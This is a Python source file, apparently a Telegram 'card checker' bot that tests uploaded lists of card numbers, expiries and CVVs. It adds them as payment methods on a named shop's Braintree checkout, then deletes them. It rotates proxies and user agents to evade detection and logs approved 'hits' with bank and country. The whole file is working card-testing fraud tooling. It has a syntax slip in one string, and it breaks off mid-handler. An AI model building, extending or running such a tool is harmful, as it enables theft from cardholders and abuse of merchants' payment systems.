"""
Woolroots Braintree Checker v6 — Railway Ready
Owner: @DarkCarder05
"""
import os
import re
import time
import base64
import random
import uuid
import threading
import logging
import itertools
from threading import Lock

import requests
from bs4 import BeautifulSoup
import telebot
from telebot import types

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("wool")

# ── CONFIG ──
BOT_TOKEN   = os.getenv("BOT_TOKEN", "")
OWNER_ID    = int(os.getenv("OWNER_ID", "0"))
OWNER_TAG   = "@DarkCarder05"
BOT_NAME    = "TON B3 CHECKER"

SITE        = "https://www.woolroots.com"
LOGIN_URL   = SITE + "/my-account/"
ADD_PM_URL  = SITE + "/my-account/add-payment-method/"
AJAX_URL    = SITE + "/wp-admin/admin-ajax.php"
BT_GRAPHQL  = "https://payments.braintree-api.com/graphql"

LOGIN_USER  = os.getenv("LOGIN_USER", "")
LOGIN_PASS  = os.getenv("LOGIN_PASS", "")

DELAY_MIN = 3
DELAY_MAX = 7
PROXY_MAX_RETRIES = 3

# ── PROXY ──
PROXY_USER = os.getenv("PROXY_USER", "")
PROXY_PASS = os.getenv("PROXY_PASS", "")

RAW_HOSTS = [
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
    "95.211.174.135:3128",
    "103.237.102.191:11111",
    "184.75.221.82:3118",
    "185.191.239.248:3128",
]

def _build_proxies():
    out = []
    for h in RAW_HOSTS:
        if PROXY_USER and PROXY_PASS:
            out.append("http://" + PROXY_USER + ":" + PROXY_PASS + "@" + h)
        else:
            out.append("http://" + h)
    return out

PROXIES = _build_proxies()
_proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
_proxy_lock = Lock()

def next_proxy():
    if not _proxy_cycle:
        return None
    with _proxy_lock:
        return next(_proxy_cycle)

def proxy_dict(p):
    if not p:
        return None
    return {"http": p, "https": p}

def masked_proxy(p):
    if not p:
        return "DIRECT"
    if "@" in p:
        return p.split("@")[-1]
    return p.replace("http://", "").replace("https://", "")

# ── UA ──
UAS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]
def rand_ua():
    return random.choice(UAS)

# ── EMOJI ──
EM = {
    "diamond":  ("💎", "5042050649248760772"),
    "crown":    ("👑", "5039727497143387500"),
    "crown2":   ("👑", "5039539210072097557"),
    "crown3":   ("👑", "5041792560368977040"),
    "fire":     ("❤️‍🔥", "5042225965518816316"),
    "star":     ("⭐️", "5042176294222037888"),
    "sparkle":  ("💫", "5042200814190330758"),
    "bolt":     ("⚡️", "5042334757040423886"),
    "top":      ("🔝", "5042102141611672423"),
    "money":    ("💰", "5039789890133296083"),
    "cash":     ("💵", "5040025580758631490"),
    "good":     ("✔️", "5039844895779455925"),
    "cross":    ("❌", "5040042498634810056"),
    "no":       ("🚫", "5039671744172917707"),
    "warn":     ("⚠️", "5039665997506675838"),
    "green":    ("🟢", "5039928501612839813"),
    "arrow_r":  ("➡️", "5042341817966658405"),
    "reload":   ("🔄", "5041837837914211014"),
    "wave":     ("👋", "5040033797031070992"),
    "shield":   ("🛡", "5042328396193864923"),
    "chart":    ("📊", "5042290883949495533"),
    "target":   ("📍", "5039775669496579510"),
    "pin":      ("📍", "5039895103947146186"),
    "skull":    ("💀", "5042209657527993345"),
    "broom":    ("🧹", "5039751080808809534"),
    "candle":   ("🕯", "5041976440803820473"),
}

def e(name, fb=None):
    item = EM.get(name)
    if not item:
        return fb or "•"
    fallback, eid = item
    return '<tg-emoji emoji-id="' + eid + '">' + fallback + '</tg-emoji>'

_MB = {}
for i in range(26):
    _MB[chr(ord('A') + i)] = chr(0x1D400 + i)
    _MB[chr(ord('a') + i)] = chr(0x1D41A + i)
for i in range(10):
    _MB[chr(ord('0') + i)] = chr(0x1D7CE + i)

def bold(t):
    return "".join(_MB.get(c, c) for c in str(t))

# ── STATE ──
STOP_FLAG = {"stop": False}
USER_STATS = {}
_BIN_CACHE = {}

# ── HELPERS ──
def luhn_ok(number):
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
        if len(digits) < 12:
            return False
        s = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            s += d
        return s % 10 == 0
    except:
        return False

def parse_card(line):
    parts = re.split(r"[|/, ]+", line.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r"\D", "", cc)
    if not (13 <= len(cc) <= 19):
        return None
    if not luhn_ok(cc):
        return None
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        return None
    if not (yy.isdigit() and len(yy) in (2, 4)):
        return None
    if not (cvv.isdigit() and len(cvv) in (3, 4)):
        return None
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def bin_lookup(cc):
    b = cc[:6]
    if b in _BIN_CACHE:
        return _BIN_CACHE[b]
    try:
        r = requests.get(
            "https://lookup.binlist.net/" + b,
            headers={"Accept-Version": "3"},
            timeout=8
        ).json()
        info = (str(r.get('scheme', '-')) + " " + str(r.get('type', '-')) + " " + str(r.get('brand', '-'))).upper()
        bank = str(r.get('bank', {}).get('name', '-')).upper()
        country = str(r.get('country', {}).get('name', '-')) + " " + str(r.get('country', {}).get('emoji', ''))
        _BIN_CACHE[b] = (info, bank, country)
        return info, bank, country
    except:
        _BIN_CACHE[b] = ("UNKNOWN", "UNKNOWN", "UNKNOWN")
        return "UNKNOWN", "UNKNOWN", "UNKNOWN"

# ── DELETE ──
def extract_delete_link(html, base_url):
    try:
        soup = BeautifulSoup(html, "html.parser")
        for sel in ['a[href*="delete-payment-method"]', 'a[href*="delete"]']:
            el = soup.select_one(sel)
            if el and el.get("href"):
                href = el["href"]
                if href.startswith("http"):
                    return href
                return base_url.rstrip("/") + "/" + href.lstrip("/")
        m = re.search(r'href="([^"]*delete-payment-method[^"]*)"', html, re.I)
        if m:
            href = m.group(1).replace("&amp;", "&")
            if href.startswith("http"):
                return href
            return base_url.rstrip("/") + "/" + href.lstrip("/")
    except:
        pass
    return None

def delete_payment_method(session, delete_url):
    try:
        r = session.get(delete_url, timeout=25)
        if r.status_code != 200:
            return False, "GET " + str(r.status_code)
        m = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
        if not m:
            m = re.search(r'name="woocommerce-delete-payment-method-nonce" value="(.*?)"', r.text)
        nonce = m.group(1) if m else None
        data = {"_wpnonce": nonce} if nonce else {}
        data["_wp_http_referer"] = "/my-account/add-payment-method/"
        soup = BeautifulSoup(r.text, "html.parser")
        for inp in soup.select("form input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name and name not in data:
                data[name] = val
        r2 = session.post(
            delete_url, data=data, timeout=25,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": delete_url}
        )
        low = r2.text.lower()
        if any(k in low for k in ["deleted", "removed", "payment method successfully", "no payment methods", "no saved"]):
            return True, "deleted"
        if "delete-payment-method" not in r2.text:
            return True, "deleted"
        return False, "unclear"
    except Exception as ex:
        return False, "EXC: " + str(ex)[:40]

def ensure_clean_slate(session):
    try:
        r = session.get(ADD_PM_URL, timeout=25)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.select('a[href*="delete-payment-method"]'):
            href = a.get("href")
            if href:
                if not href.startswith("http"):
                    href = SITE.rstrip("/") + "/" + href.lstrip("/")
                delete_payment_method(session, href)
    except:
        pass

# ── CHECK ──
def check_card(line):
    parsed = parse_card(line)
    if not parsed:
        return {
            "status": "error", "response": "INVALID_FORMAT", "card": line,
            "bin": "-", "bank": "-", "country": "-",
            "deleted": None, "delete_msg": "", "proxy": "-"
        }
    last_result = None
    for attempt in range(1, PROXY_MAX_RETRIES + 1):
        proxy = next_proxy()
        r = _attempt_check(parsed, proxy)
        if r["status"] != "proxy_dead":
            return r
        last_result = r
        logger.warning("proxy attempt " + str(attempt) + " failed, retrying...")
        time.sleep(1.5)
    last_result["status"] = "error"
    last_result["response"] = "ALL_PROXIES_FAILED"
    return last_result

def _attempt_check(parsed, proxy):
    cc, mm, yy, cvv = parsed
    proxies = proxy_dict(proxy)
    ua = rand_ua()

    s = requests.Session()
    s.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})
    if proxies:
        s.proxies = proxies

    base = {
        "card": cc, "bin": "-", "bank": "-", "country": "-",
        "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
    }

    try:
        r = s.get(LOGIN_URL, timeout=25)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
        if not m:
            return _err("LOGIN_NONCE_FAIL", base)

        r = s.post(
            LOGIN_URL,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": LOGIN_URL},
            data={
                "username": LOGIN_USER, "password": LOGIN_PASS,
                "woocommerce-login-nonce": m.group(1),
                "_wp_http_referer": "/my-account/", "login": "Log in"
            },
            timeout=25
        )
        if "logout" not in r.text.lower() and "/my-account" not in r.url:
            return _err("LOGIN_FAIL", base)

        ensure_clean_slate(s)

        r = s.get(ADD_PM_URL, headers={"Referer": LOGIN_URL}, timeout=25)
        m = re.search(r'"client_token_nonce":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_NONCE", base)
        client_nonce = m.group(1)

        r = s.post(
            AJAX_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={"action": "wc_braintree_credit_card_get_client_token", "nonce": client_nonce},
            timeout=25
        )
        m = re.search(r'"data":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_TOKEN", base)
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
        except:
            return _err("TOKEN_DECODE_FAIL", base)
        m = re.search(r'"authorizationFingerprint":"(.*?)"', decoded)
        if not m:
            return _err("NO_AUTH_FP", base)
        auth_fp = m.group(1)

        bt_headers = {
            "authority": "payments.braintree-api.com",
            "authorization": "Bearer " + auth_fp,
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": ua,
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client", "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc, "expirationMonth": mm,
                        "expirationYear": yy, "cvv": cvv
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        r = requests.post(BT_GRAPHQL, headers=bt_headers, json=payload, proxies=proxies, timeout=30)
        try:
            j = r.json()
        except:
            return _err("BT_BAD_RESPONSE", base)

        if "errors" in j:
            err = str(j["errors"]).lower()
            if "cvv" in err or "security code" in err:
                return _ok("declined", "CVV_MISMATCH", cc, base)
            if "expired" in err or "expiration" in err:
                return _ok("declined", "EXPIRED_CARD", cc, base)
            if "invalid" in err or "not a valid" in err or "invalid number" in err:
                return _ok("declined", "INVALID_CARD", cc, base)
            return _ok("declined", "BT: " + err[:60], cc, base)

        token = (j.get("data", {}).get("tokenizeCreditCard", {}) or {}).get("token")
        if not token:
            return _ok("declined", "NO_TOKEN_FROM_BT", cc, base)

        r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
        m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)
        if not m:
            return _err("NO_ADD_NONCE", base)
        add_nonce = m.group(1)

        r = s.post(
            ADD_PM_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "visa",
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": '{"correlation_id":"' + uuid.uuid4().hex + '"}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": add_nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            },
            timeout=40
        )

        soup = BeautifulSoup(r.text, "html.parser")
        msg = ""
        try:
            el = soup.find("i", class_="nm-font nm-font-close")
            if el and el.parent:
                msg = el.parent.text.strip()
        except:
            pass
        if not msg:
            for sel in [".woocommerce-error li", ".woocommerce-message", ".woocommerce-info", "ul.woocommerce-error"]:
                el = soup.select_one(sel)
                if el:
                    msg = el.text.strip()
                    break
        low = (msg + " " + r.text[:1200]).lower()

        added = any(k in low for k in ["new payment method added", "payment method successfully added", "successfully added"])
        if added:
            r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
            del_url = extract_delete_link(r2.text, SITE)
            deleted = None
            del_msg = ""
            if del_url:
                ok_del, del_msg = delete_payment_method(s, del_url)
                deleted = bool(ok_del)
            else:
                deleted = False
                del_msg = "no link"
            base["deleted"] = deleted
            base["delete_msg"] = del_msg
            return _ok("approved", msg or "CARD ADDED", cc, base)

        if "duplicate card exists" in low:
            return _ok("declined", "DUPLICATE_CARD", cc, base)
        if "insufficient" in low or "not enough" in low:
            return _ok("declined", "INSUFFICIENT_FUNDS", cc, base)
        if "cvv" in low or "security code" in low:
            return _ok("declined", "CVV_MISMATCH", cc, base)
        if "gateway rejected" in low and "avs" in low:
            return _ok("declined", "GATEWAY_REJECTED:AVS", cc, base)
        if "risk" in low or "fraud" in low:
            return _ok("declined", msg[:100] or "RISK", cc, base)
        if any(k in low for k in ["declined", "invalid", "expired", "failed", "error"]):
            return _ok("declined", msg[:100] or "DECLINED", cc, base)
        return _ok("declined", msg[:100] or "DECLINED", cc, base)

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as pe:
        return {
            "status": "proxy_dead",
            "response": "PROXY_DEAD: " + str(pe)[:40],
            "card": cc, "bin": "-", "bank": "-", "country": "-",
            "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
        }
    except requests.exceptions.Timeout:
        return _err("TIMEOUT", base)
    except Exception as ex:
        return _err("EXC: " + str(ex)[:60], base)
    finally:
        try:
            s.close()
        except:
            pass

def _ok(status, response, cc, base):
    info, bank, country = bin_lookup(cc)
    return {
        "status": status, "response": response, "card": cc,
        "bin": info, "bank": bank, "country": country,
        "deleted": base.get("deleted"), "delete_msg": base.get("delete_msg", ""),
        "proxy": base.get("proxy", "-")
    }

def _err(reason, base):
    info, bank, country = bin_lookup(base["card"])
    return {
        "status": "error", "response": reason, "card": base["card"],
        "bin": info, "bank": bank, "country": country,
        "deleted": None, "delete_msg": "",
        "proxy": base.get("proxy", "-")
    }

# ── BOT ──
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

def main_kb(uid):
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        types.InlineKeyboardButton("📊 Stats", callback_data="ui_stats"),
        types.InlineKeyboardButton("💎 Hits", callback_data="ui_hits"),
    )
    kb.add(
        types.InlineKeyboardButton("🛡 Proxies", callback_data="ui_proxy"),
        types.InlineKeyboardButton("📖 Help", callback_data="ui_help"),
    )
    kb.add(types.InlineKeyboardButton("👑 Owner", url="https://t.me/DarkCarder05"))
    return kb

def back_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("◀ Back", callback_data="ui_main"))
    return kb

def welcome_text(name):
    parts = [
        e('crown') + " <b>╔══════════════════════════╗</b> " + e('crown'),
        "<b>   " + bold('TON B3 CHECKER') + "   </b>",
        e('diamond') + " <b>╚══════════════════════════╝</b> " + e('diamond'),
        "",
        e('wave') + " <b>Welcome " + str(name) + "!</b> " + e('fire'),
        "",
        e('bolt') + " <b>Gateway:</b> Braintree (B3) Auth",
        e('pin') + " <b>Site:</b> <code>woolroots.com</code>",
        e('shield') + " <b>Proxy:</b> <code>" + str(len(PROXIES)) + " loaded</code>",
        e('green') + " <b>Status:</b> Online",
        "",
        e('top') + " <b>How to check:</b>",
        "   " + e('arrow_r') + " Send any <code>.txt</code> file with cards",
        "   " + e('arrow_r') + " Reply to that file with <code>/chk</code>",
        "   " + e('arrow_r') + " Watch hits roll in " + e('diamond'),
        "",
        "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
        e('crown2') + " <b>Bot By " + OWNER_TAG + "</b> " + e('star'),
    ]
    return "\n".join(parts)

def hit_text(r):
    lines = []
    lines.append(e('fire') + " <b>╔══════════════════════════╗</b> " + e('fire'))
    lines.append("<b>   " + bold('APPROVED') + "   </b>")
    lines.append(e('diamond') + " <b>╚══════════════════════════╝</b> " + e('diamond'))
    lines.append("")
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃ " + e('cash') + " <b>CC</b> ➤ <code>" + str(r['card']) + "</code>")
    lines.append("┃ " + e('target') + " <b>Response</b> ➤ <b>" + str(r['response']) + "</b>")
    lines.append("┃ " + e('bolt') + " <b>Gateway</b> ➤ Braintree Auth")
    lines.append("┃ " + e('shield') + " <b>Proxy</b> ➤ <code>" + str(r.get('proxy', '-')) + "</code>")
    if r.get("deleted") is True:
        lines.append("┃ " + e('broom') + " <b>Deleted:</b> " + e('good'))
    elif r.get("deleted") is False:
        lines.append("┃ " + e('broom') + " <b>Deleted:</b> " + e('cross') + " (" + str(r.get('delete_msg', '')) + ")")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
    lines.append(e('money') + " <b>BIN</b> ➤ <code>" + str(r['bin']) + "</code>")
    lines.append(e('money') + " <b>Bank</b> ➤ <code>" + str(r['bank']) + "</code>")
    lines.append(e('pin') + " <b>Country</b> ➤ <code>" + str(r['country']) + "</code>")
    lines.append("")
    lines.append("<b>━━━━━━━━━━━━━━━━━━━━━━━</b>")
    lines.append(e('crown3') + " <b>Bot By " + OWNER_TAG + "</b> " + e('sparkle'))
    return "\n".join(lines)

def progress_text(done, total, ok, bad, risk, err, elapsed):
    bar_len = 12
    filled = int(bar_len * done / total) if total else 0
    bar = "▰" * filled + "▱" * (bar_len - filled)
    pct = int(100 * done / total) if total else 0
    lines = []
    lines.append(e('bolt') + " <b>╔══════════════════════════╗</b> " + e('bolt'))
    lines.append("<b>   " + bold('CHECKING...') + "   </b>")
    lines.append(e('diamond') + " <b>╚══════════════════════════╝</b> " + e('diamond'))
    lines.append("")
    lines.append(e('chart') + " <b>Progress</b> ➤ <code>" + str(done) + "/" + str(total) + "</code>")
    lines.append("<code>" + bar + "</code> <b>" + str(pct) + "%</b>")
    lines.append("")
    lines.append(e('diamond') + " <b>Approved</b> ➤ <code>" + str(ok) + "</code>")
    lines.append(e('cross') + " <b>Declined</b> ➤ <code>" + str(bad) + "</code>")
    lines.append(e('warn') + " <b>Risk</b>     ➤ <code>" + str(risk) + "</code>")
    lines.append(e('skull') + " <b>Error</b>    ➤ <code>" + str(err) + "</code>")
    lines.append("")
    lines.append(e('candle') + " <b>Time</b> ➤ <code>" + str(int(elapsed)) + "s</code>")
    lines.append(e('reload') + " <b>Rotating proxies + UAs</b>")
    return "\n".join(lines)

def summary_text(total, ok, bad, risk, err, delete_fail, elapsed):
    lines = []
    lines.append(e('crown') + " <b>╔══════════════════════════╗</b> " + e('crown'))
    lines.append("<b>   " + bold('CHECK FINISHED') + "   </b>")
    lines.append(e('star') + " <b>╚══════════════════════════╝</b> " + e('star'))
    lines.append("")
    lines.append(e('chart') + " <b>Total</b>       ➤ <code>" + str(total) + "</code>")
    lines.append(e('diamond') + " <b>Approved</b>    ➤ <code>" + str(ok) + "</code>")
    lines.append(e('cross') + " <b>Declined</b>    ➤ <code>" + str(bad) + "</code>")
    lines.append(e('warn') + " <b>Risk</b>        ➤ <code>" + str(risk) + "</code>")
    lines.append(e('skull') + " <b>Error</b>       ➤ <code>" + str(err) + "</code>")
    lines.append(e('broom') + " <b>Delete fail</b> ➤ <code>" + str(delete_fail) + "</code>")
    lines.append("")
    lines.append(e('candle') + " <b>Time</b> ➤ <code>" + str(int(elapsed)) + "s</code>")
    lines.append("")
    lines.append("<b>━━━━━━━━━━━━━━━━━━━━━━━</b>")
    lines.append(e('crown2') + " <b>Bot By " + OWNER_TAG + "</b>")
    return "\n".join(lines)

# ── HANDLERS ──
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    name = msg.from_user.first_name or "User"
    USER_STATS.setdefault(msg.from_user.id, {"ok": 0, "bad": 0, "risk": 0, "err": 0, "total": 0})
    bot.reply_to(msg, welcome_text(name), reply_markup=main_kb(msg.from_user.id))

@bot.message_handler(commands=["menu"])
def cmd_menu(msg):
    bot.reply_to(msg, e('diamond') + " <b>Main Menu</b>", reply_markup=main_kb(msg.from_user.id))

@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    STOP_FLAG["stop"] = True
    bot.reply_to(msg, e('no') + " <b>Stopping check...</b>")

@bot.message_handler(commands=["proxies"])
def cmd_proxies(msg):
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, e('no') + " <b>Not authorized</b>")
        return
    lst = "\n".join(e('bolt') + " <code>" + masked_proxy(p) + "</code>" for p in PROXIES)
    bot.reply_to(msg, e('shield') + " <b>Proxy Pool (" + str(len(PROXIES)) + "):</b>\n\n" + lst)

@bot.message_handler(commands=["chk"])
def cmd_chk(msg):
    replied = msg.reply_to_message
    if not replied or not replied.document:
        bot.reply_to(
            msg,
            e('pin') + " <b>How to use:</b>\n\n" +
            e('arrow_r') + " Send a <code>.txt</code> file with cards\n" +
            e('arrow_r') + " Reply to it with <code>/chk</code>"
        )
        return
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, e('no') + " <b>Not authorized</b>")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        bot.reply_to(msg, e('no') + " <b>Only .txt files</b>")
        return
    try:
        file_info = bot.get_file(doc.file_id)
        content = bot.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    except Exception as ex:
        bot.reply_to(msg, e('warn') + " Download failed: " + str(ex))
        return
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    parsed = [l for l in lines if parse_card(l)]
    if not parsed:
        bot.reply_to(msg, e('cross') + " <b>No valid cards</b>")
        return
    STOP_FLAG["stop"] = False
    start_msg = "\n".join([
        e(' +fire') + " <b>╔══════════════════════════╗</b> " + e('fire'),
        "<b>   " + bold('STARTING CHECK') + "   </b>",
        e('bolt') + " <b>╚══════════════════════════╝</b> " + e('bolt'),
        "",
        e('pin') + " <b>File</b> ➤ <code>" + str(doc.file_name) + "</code>",
        e('cash') + " <b>Cards</b> ➤ <code>" + str(len(parsed)) "</code>",
        e('shield') + " <b>Proxies</b> ➤ <code>" + str(len(PROXIES)) + "</code>",
        "",
        "<i>Rotating every card " + e('reload') + "</i>",
    ])
    bot.reply_to(msg, start_msg)
    threading.Thread(target=run_check, args=(msg.chat.id, parsed, msg.from_user.id), daemon=True).start()

def run_check(chat_id, cards, uid):
    total = len(cards)
    ok = 0
    bad = 0
    risk = 0
    err = 0
    delete_fail = 0
    status_msg = bot.send_message(chat_id, progress_text(0, total, 0, 0, 0, 0, 0))
    start = time.time()
    for i, card in enumerate(cards, 1):
        if STOP_FLAG["stop"]:
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg.message_id,
                    text=e('no') + " <b>Stopped at " + str(i-1) + "/" + str(total) + "</b>",
                    parse_mode="HTML"
                )
            except:
                pass
            break
        try:
            r = check_card(card)
        except Exception as ex:
            r = {
                "status": "error", "response": "EXC: " + str(ex), "card": card,
                "bin": "-", "bank": "-", "country": "-",
                "deleted": None, "delete_msg": "", "proxy": "-"
            }
        if r["status"] == "approved":
            ok += 1
            if r.get("deleted") is False:
                delete_fail += 1
            _send_hit(chat_id, r)
        elif r["status"] == "risk":
            risk += 1
        elif r["status"] == "declined":
            bad += 1
        else:
            err += 1
        if i % 2 == 0 or i == total:
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg.message_id,
                    text=progress_text(i, total, ok, bad, risk, err, time.time() - start),
                    parse_mode="HTML"
                )
            except:
                pass
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
    elapsed = time.time() - start
    summary = summary_text(total, ok, bad, risk, err, delete_fail, elapsed)
    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=status_msg.message_id,
            text=summary, parse_mode="HTML"
        )
    except:
        bot.send_message(chat_id, summary, parse_mode="HTML")
    if uid in USER_STATS:
        USER_STATS[uid]["ok"] += ok
        USER_STATS[uid]["bad"] += bad
        USER_STATS[uid]["risk"] += risk
        USER_STATS[uid]["err"] += err
        USER_STATS[uid]["total"] += total

def _send_hit(chat_id, r):
    try:
        bot.send_message(chat_id, hit_text(r), parse_mode="HTML")
    except Exception as ex:
        logger.warning("hit send fail: " + str(ex))
    try:
        with open("hits_woolroots.txt", "a") as f:
            f.write(str(r['card']) + " | " + str(r['response']) + " | " + str(r['bin']) + " | " + str(r['bank']) + " | proxy=" + str(r.get('proxy')) + " | del=" + str(r.get('deleted')) + "\n")
    except:
        pass

# ── CALLBACKS ──
@bot.callback_query_handler(func=lambda c: True)
def on_cb(c):
    d = c.data
    uid = c.from_user.id
    try:
        bot.answer_callback_query(c.id)
    except:
        pass

    if d == "ui_main":
        bot.edit_message_text(
            chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=welcome_text(c.from_user.first_name or "User"),
            reply_markup=main_kb(uid), parse_mode="HTML"
        )

    elif d == "ui_proxy":
        lst = "\n".join(e('bolt') + " <code>" + masked_proxy(p) + "</code>" for p in PROXIES)
        txt = "\n".join([
            e('shield') + " <b>Proxy Pool (" + str(len(PROXIES)) + ")</b>",
            "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
            lst,
            "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
            e('reload') + " Auto-rotate per card",
        ])
        bot.edit_message_text(
            chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML"
        )

    elif d == "ui_stats":
        st = USER_STATS.get(uid, {"ok": 0, "bad": 0, "risk": 0, "err": 0, "total": 0})
        hits = 0
        try:
            with open("hits_woolroots.txt") as f:
                hits = sum(1 for _ in f if not _.startswith("#"))
        except:
            pass
        txt = "\n".join([
            e('chart') + " <b>╔══════════════════════════╗</b> " + e('chart'),
            "<b>   " + bold('YOUR STATS') + "   </b>",
            e('diamond') + " <b>╚══════════════════════════╝</b> " + e('diamond'),
            "",
            e('wave') + " <b>User</b> ➤ <code>" + str(uid) + "</code>",
            "",
            e('pin') + " <b>Your checks</b> ➤ <code>" + str(st['total']) + "</code>",
            e('diamond') + " <b>Approved</b> ➤ <code>" + str(st['ok']) + "</code>",
            e('cross') + " <b>Declined</b> ➤ <code>" + str(st['bad']) + "</code>",
            e('warn') + " <b>Risk</b> ➤ <code>" + str(st['risk']) + "</code>",
            e('skull') + " <b>Error</b> ➤ <code>" + str(st['err']) + "</code>",
            "",
            e('shield') + " <b>Proxies</b> ➤ <code>" + str(len(PROXIES)) + "</code>",
            e('pin') + " <b>Global hits</b> ➤ <code>" + str(hits) + "</code>",
            "",
            "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
            e('crown3') + " <b>Bot By " + OWNER_TAG + "</b>",
        ])
        bot.edit_message_text(
            chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML"
        )

    elif d == "ui_hits":
        try:
            with open("hits_woolroots.txt") as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except:
            lines = []
        if not lines:
            txt = e('diamond') + " <b>No hits yet</b>"
        else:
            last = lines[-10:][::-1]
            body = "\n".join(e('cash') + " <code>" + l.split(" | ")[0] + "</code>" for l in last)
            txt = "\n".join([
                e('diamond') + " <b>Last Hits</b>",
                "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
                body,
                "<b>━━━━━━━━━━━━━━━━━━━━━━━</b>",
                e('chart') + " <b>Total:</b> <code>" + str(len(lines)) + "</code>",
            ])
        bot.edit_message_text(
            chat_id=c.message.chat.id, message_id=c.message.message_id,
            text=txt, reply_markup=back_kb(), parse_mode="HTML"
        )

    elif d == "ui_help":
        txt = "\n".join([
            e('pin') + " <b>╔══════════════════════════╗</b> " + e('pin'),
            "<b>   " + bold('HOW TO USE') + "   </b>",
            e('diamond') + " <b>╚══════════════════════════╝</b> " + e('diamond'),
            "",
            e('arrow_r') + " Prepare a <code>.txt</code> file",
            "   <i>Format: cc|mm|yy|cvv</i>",
            "   <i>Example: 4111111111111111|12|26|123</i>",
            "",
            e('arrow_r') + " Send the file to this bot",
            "",
